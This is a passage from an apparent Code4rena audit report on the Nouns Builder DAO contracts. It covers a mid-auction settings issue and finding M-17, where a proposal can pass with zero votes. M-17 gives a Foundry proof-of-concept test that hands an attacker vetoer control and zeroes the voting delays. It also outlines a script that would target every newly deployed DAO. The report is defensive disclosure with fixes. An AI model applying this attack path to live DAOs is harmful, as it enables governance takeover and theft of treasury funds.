class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">TimeBufferUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_timeBuffer</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setMinimumBidIncrement</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_percentage</span><span class=\"mtk1\">) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">settings</span><span class=\"mtk1\">.</span><span class=\"mtk12\">minBidIncrement</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">SafeCast</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toUint8</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_percentage</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MinBidIncrementPercentageUpdated</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_percentage</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-20\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-20\" aria-label=\"recommended mitigation steps 20 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li>Do not apply changed parameters on ongoing auctions </li>\n<li>Add a timelock for the changes</li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/450#issuecomment-1257942118\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how settings can be changed mid-auction, this can create undefined behaviour (insta-settlement, change of price).</p>\n<p>While max loss is one token or the inability to settle the auction, because this could create a “social accident”, I believe that Medium Severity is appropriate.</p>\n<p>Changes should either be cached in the Auction Parameters, or should be applied to the next auction to avoid any unexpected surprise</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/450\">kulkarohan (Nouns Builder) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-17-a-proposal-can-pass-with-0-votes-in-favor-at-early-dao-stages\" style=\"position:relative;\"><a href=\"#m-17-a-proposal-can-pass-with-0-votes-in-favor-at-early-dao-stages\" aria-label=\"m 17 a proposal can pass with 0 votes in favor at early dao stages permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/436\">[M-17] A proposal can pass with 0 votes in favor at early DAO stages</a></h2>\n<p><em>Submitted by azephiar, also found by __141345__, bin2chen, cccz, davidbrai, pauliax, R2, rbserver, and Solimander</em></p>\n<p>It’s possible to create a proposal for a DAO as soon as it’s deployed and the proposal can pass even if nobody votes.</p>\n<p>This possibility of doing so is based on the following assumptions:</p>\n<ol>\n<li>The vetoer doesn’t veto the proposal</li>\n<li><code>proposal.quorumVotes</code> is 0, which happens when <code>token.totalSupply() * settings.quorumThresholdBps &#x3C; 10_000</code></li>\n<li><code>proposal.proposalThreshold</code> is 0, which happens when <code>token.totalSupply() * settings.proposalThresholdBps &#x3C; 10_000</code></li>\n</ol>\n<p>The amount of time necessary to create and execute a proposal of this kind is dictated by <code>governor.settings.votingDelay + governor.settings.votingDelay + treasury.delay()</code>, the lower the time the higher the risk.</p>\n<h3 id=\"impact-7\" style=\"position:relative;\"><a href=\"#impact-7\" aria-label=\"impact 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>A malicious actor could build an off-chain script that tracks <code>DAODeployed</code> events on the <code>Manager.sol</code> contract. Every time a new DAO is spawned the script submits a proposal. This attack is based on the fact that such at an early stage nobody might notice and the chances of this happening are made real because every new DAO can be targeted.</p>\n<p>A potential proposal created by an attacker might look like this:</p>\n<ol>\n<li>Call <code>governor.updateVetoer(attacker)</code></li>\n<li>Call <code>governor.updateVotingDelay(0)</code></li>\n<li>Call <code>governor.updateVotingPeriod(0)</code></li>\n<li>Call <code>treasury.updateGracePeriod(0)</code></li>\n<li>Call <code>treasury.updateDelay(1 day)</code></li>\n</ol>\n<p>With this setup the attacker can make a proposal and queue it immediately to then execute it after 1 day time; which gives him the time to veto any proposal that tries to interfere with the attack. At this point the attacker has sudo powers and if there’s any bid he can take the funds.</p>\n<p>This is just one possible attack path, but the point is making a proposal pass can give an attacker sudo powers and nobody might notice for a while.</p>\n<h3 id=\"proof-of-concept-18\" style=\"position:relative;\"><a href=\"#proof-of-concept-18\" aria-label=\"proof of concept 18 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Here’s a test I wrote that proves the attack path outlined above, you can copy it into <code>Gov.t.sol</code> and execute it with <code>forge test -m test_sneakProposalAttack</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"62\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_sneakProposalAttack</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addr</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0x55</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targets</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">address</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">5</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">values</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">5</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">5</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 1. Call `governor.updateVetoer(attacker)`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">values</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSignature</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;updateVetoer(address)&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">attacker</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// 2. Call `governor.updateVotingDelay(0)`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">values</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">[</span><span class=\"mtk7\">1</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSignature</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;updateVotingDelay(uint256)&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//3. Call `governor.updateVotingPeriod(0)`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">values</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">[</span><span class=\"mtk7\">2</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSignature</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;updateVotingPeriod(uint256)&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//3. Call `treasury.updateGracePeriod(0)`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">[</span><span class=\"mtk7\">3</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">values</span><span class=\"mtk1\">[</span><span class=\"mtk7\">3</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">[</span><span class=\"mtk7\">3</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSignature</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;updateGracePeriod(uint256)&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//4. Call `treasury.updateDelay(1 day)`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">targets</span><span class=\"mtk1\">[</span><span class=\"mtk7\">4</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">values</span><span class=\"mtk1\">[</span><span class=\"mtk7\">4</span><span class=\"mtk1\">] = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">[</span><span class=\"mtk7\">4</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSignature</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;updateDelay(uint256)&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk7\">60</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">60</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">24</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//Attacker creates proposal as soon as contract is deployed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">propose</span><span class=\"mtk1\">(</span><span class=\"mtk12\">targets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">values</span><span class=\"mtk1\">, </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//Wait for proposal.voteEnd</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">((</span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getProposal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">).</span><span class=\"mtk12\">voteEnd</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//Queue it</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">queue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//Wait for treasury delay</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">treasury</span><span class=\"mtk1\">.</span><span class=\"mtk11\">delay</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//Execute proposal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">targets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">values</span><span class=\"mtk1\">, </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">, </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//Shows it&#39;s now possible for an attacker to queue a proposal immediately</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">proposalId2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">propose</span><span class=\"mtk1\">(</span><span class=\"mtk12\">targets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">values</span><span class=\"mtk1\">, </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;mock&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">queue</span><span class=\"mtk1\">(</span><span class=\"mtk12\">proposalId2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">//And executed it after one day</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">warp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">60</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">60</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">24</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">governor</span><span class=\"mtk1\">.</span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">targets</span><span class=\"mtk1\">, </span><span class=\"mtk12\">values</span><span class=\"mtk1\">, </span><span class=\"mtk12\">calldatas</span><span class=\"mtk1\">, </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk11\">bytes</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;mock&quot;</span><span class=\"mtk1\">)));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-21\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-21\" aria-label=\"recommended mitigation steps 21 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>This potential attack path comes from a combination of factors, maninly:</p>\n<ol>\n<li>A proposal can be created directly after deployment</li>\n<li>The <code>proposal.proposal.proposalThreshold</code> and <code>proposal.quorumVotes</code> are set to 0 at such early stages</li>\n<li>A proposal with 0 votes is allowed to pass</li>\n</ol>\n<p>I would say that requiring at least 1 vote for a proposal to be considered <code>Succeeded</code> is rational and should mitigate this problem because that would require the attacker to bid on auction to get 1 voting power, increasing the cost and the time necessary for the attack.</p>\n<p>At <a href=\"https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441\">Governor.sol#L441</a> we have:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"63\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">forVotes</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">againstVotes</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">forVotes</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quorumVotes</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Defeated</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>which can be changed to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"64\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">forVotes</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">forVotes</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">againstVotes</span><span class=\"mtk1\"> || </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">forVotes</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">proposal</span><span class=\"mtk1\">.</span><span class=\"mtk12\">quorumVotes</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ProposalState</span><span class=\"mtk1\">.</span><span class=\"mtk12\">Defeated</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/436#issuecomment-1251512891\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>If total supply == 0, means it’s conditional, disagree with High.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/436#issuecomment-1258033484\">Alex the Entreprenerd (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, because of rounding of numbers and a lack of an absolute value, a proposal can be proposed and made to pass with zero votes.</p>\n<p>This is contingent on:</p>\n<ul>\n<li>Holders not voting against</li>\n<li>Vetoer not responding</li>\n<li>TotalSupply being low enough</li>\n</ul>\n<p>And the impact is limited to the funds available to the treasury at that time (expected to be low compared to a more mature protocol).</p>\n<p>Because of the above, I believe Medium Severity to be more appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/436\">kulkarohan (Nouns Builder) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-18-precision-is-not-enough-for-proposalthreshold-and-quorum-collections-with-at-least-20000-nfts-in-total-supply-may-have-some-trouble\" style=\"position:relative;\"><a 